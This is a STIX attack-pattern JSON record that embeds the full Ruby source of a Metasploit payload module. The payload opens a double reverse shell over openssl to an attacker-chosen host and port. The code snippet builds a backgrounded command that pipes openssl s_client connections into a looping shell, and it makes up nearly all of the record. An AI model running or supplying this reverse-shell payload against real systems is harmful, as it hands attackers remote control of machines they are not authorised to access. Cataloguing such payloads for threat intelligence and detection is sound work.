{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4d71985f-c5d0-4228-bc86-c75ce2f01eff",
    "created": "2024-08-14T16:33:19.320085Z",
    "modified": "2024-08-14T16:33:19.320088Z",
    "name": "Unix Command Shell, Double Reverse TCP SSL (openssl)",
    "description": "Creates an interactive shell through two inbound connections",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_openssl.rb",
            "external_id": "reverse_openssl.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 182\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Unix Command Shell, Double Reverse TCP SSL (openssl)',\n     'Description'   => 'Creates an interactive shell through two inbound connections',\n     'Author'        => 'hdm',\n     'License'       => MSF_LICENSE,\n     'Platform'      => 'unix',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::ReverseTcpDoubleSSL,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd',\n     'RequiredCmd'   => 'openssl',\n     'Payload'       =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('OpenSSLPath', [true, 'The path to the OpenSSL executable', 'openssl']),\n        OptString.new('ShellPath', [true, 'The path to the shell to execute', 'sh'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    cmd =\n      \"#{datastore['ShellPath']} -c '(sleep #{3600+rand(1024)}|\" +\n      \"#{datastore['OpenSSLPath']} s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}|\" +\n      \"while : ; do #{datastore['ShellPath']} && break; done 2>&1|\" +\n      \"#{datastore['OpenSSLPath']} s_client -quiet -connect #{datastore['LHOST']}:#{datastore['LPORT']}\" +\n      \" >/dev/null 2>&1 &)'\"\n    return cmd\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}